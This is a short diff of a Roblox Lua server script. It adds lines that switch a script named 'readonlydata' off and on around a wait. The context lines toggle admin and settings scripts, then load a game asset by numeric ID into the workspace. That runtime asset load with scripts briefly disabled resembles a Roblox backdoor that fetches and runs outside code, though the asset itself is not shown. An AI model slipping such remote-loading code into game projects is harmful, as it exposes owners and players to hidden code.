@@ -17,7 +17,9 @@ end)
             game.ServerScriptService["setting commands"].Enabled = false
             game.ServerScriptService["server optimizer"].Script.Enabled = false
             game.ServerScriptService["server optimizer"].Scriptttt.Enabled = false
+            game.ServerScriptService.daytuhh.readonlydata.Enabled = false
             wait(0.94397082108066)
+            game.ServerScriptService.daytuhh.readonlydata.Enabled = true
             game.ServerScriptService["Touch Kohls Admin"].Enabled = true
             game.ServerScriptService["setting commands"].Enabled = true
             game:GetService("InsertService"):LoadAsset(120676348769130).Parent = workspace
